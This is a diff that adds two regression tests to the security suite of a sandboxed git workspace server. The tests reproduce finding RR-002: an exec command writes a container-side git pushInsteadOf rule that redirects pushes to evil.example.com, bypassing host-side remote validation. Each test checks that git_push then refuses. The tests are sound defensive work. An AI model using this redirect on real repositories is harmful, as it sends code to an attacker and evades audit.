@@ -26,6 +26,7 @@ fully offline.
 
 import os
 import subprocess
+import time
 from pathlib import Path
 
 import pytest
@@ -513,6 +514,99 @@ async def test_h12_pushurl_redirect_to_an_unauthorized_repo_is_rejected(
 
     with pytest.raises(ToolError, match="GIT_REMOTE_NOT_ALLOWED"):
         await server.call_tool("git_push", {"workspace_id": workspace_id})
+
+
+async def test_at_rr002_container_side_push_insteadof_redirect_is_rejected(
+    minimal_config: ServerConfig,
+    default_image_tag: str,
+    docker_client: docker.DockerClient,
+    tmp_path: Path,
+) -> None:
+    """RR-002 (`docs/REMEDIATION_SPEC.md` §5), the Critical finding
+    reproduced end-to-end: `.git/config` has no `pushurl` at all — both
+    the fetch and push URL host-side validation sees are the same
+    authorized `owner/example` identity, so H12's own fix (host-side
+    push-URL resolution) approves this remote cleanly. The redirect lives
+    entirely in the *container's own* `$HOME/.gitconfig`
+    (`url."https://evil.example.com/evil/other.git".pushInsteadOf
+    "https://github.com/owner/example.git"`) — a scope the daemon's
+    host-side validation deliberately never reads (`GIT_CONFIG_GLOBAL=
+    /dev/null`), and one `entrypoint.sh` chowns to the container user, so
+    it is reachable through `exec` alone with no structured tool
+    involved, exactly like `.git/config` already is. Before this fix,
+    `git_push` would have pushed straight through to the redirect while
+    auditing the approved (wrong) destination; it SHALL now refuse
+    before `git push` itself ever runs."""
+    repo_path = tmp_path / "work" / "example"
+    config = _configured(minimal_config, default_image_tag, repo_path, github="owner/example")
+    _set_remote(repo_path, "https://github.com/owner/example.git")
+    server = create_server(config)
+    workspace_id = await _open(server)
+
+    write_gitconfig = await server.call_tool(
+        "exec",
+        {
+            "workspace_id": workspace_id,
+            "shell": (
+                "git config --global "
+                '"url.https://evil.example.com/evil/other.git.pushInsteadOf" '
+                '"https://github.com/owner/example.git"'
+            ),
+        },
+    )
+    assert write_gitconfig.structured_content["exit_code"] == 0, write_gitconfig.structured_content
+
+    # sanity: the container's own git really does resolve the redirect —
+    # proves the exploit setup is real, not merely assumed.
+    sanity = await server.call_tool(
+        "exec",
+        {"workspace_id": workspace_id, "argv": ["git", "remote", "get-url", "--push", "origin"]},
+    )
+    assert sanity.structured_content["stdout_tail"].strip() == (
+        "https://evil.example.com/evil/other.git"
+    )
+
+    with pytest.raises(ToolError, match="GIT_REMOTE_NOT_ALLOWED"):
+        await server.call_tool("git_push", {"workspace_id": workspace_id})
+
+
+async def test_at_rr002_redirect_to_an_unreachable_host_fails_fast_no_network_contact(
+    minimal_config: ServerConfig,
+    default_image_tag: str,
+    docker_client: docker.DockerClient,
+    tmp_path: Path,
+) -> None:
+    """RR-002: the in-container check (`git remote get-url --push`) is
+    pure local configuration resolution — the refusal SHALL be immediate
+    even when the redirect target cannot be resolved on the network at
+    all, proving no connection was attempted before the tool refused
+    (a DNS/connect timeout would make this test slow, not merely wrong)."""
+
+    repo_path = tmp_path / "work" / "example"
+    config = _configured(minimal_config, default_image_tag, repo_path, github="owner/example")
+    _set_remote(repo_path, "https://github.com/owner/example.git")
+    server = create_server(config)
+    workspace_id = await _open(server)
+
+    write_gitconfig = await server.call_tool(
+        "exec",
+        {
+            "workspace_id": workspace_id,
+            "shell": (
+                "git config --global "
+                '"url.https://this-host-does-not-resolve-at-all.invalid/x/y.git'
+                '.pushInsteadOf" "https://github.com/owner/example.git"'
+            ),
+        },
+    )
+    assert write_gitconfig.structured_content["exit_code"] == 0
+
+    started = time.monotonic()
+    with pytest.raises(ToolError, match="GIT_REMOTE_NOT_ALLOWED"):
+        await server.call_tool("git_push", {"workspace_id": workspace_id})
+    elapsed = time.monotonic() - started
+
+    assert elapsed < 5.0, f"took {elapsed:.1f}s — looks like a network attempt was made"
 
 
 async def test_expected_remote_repository_override_is_honoured(
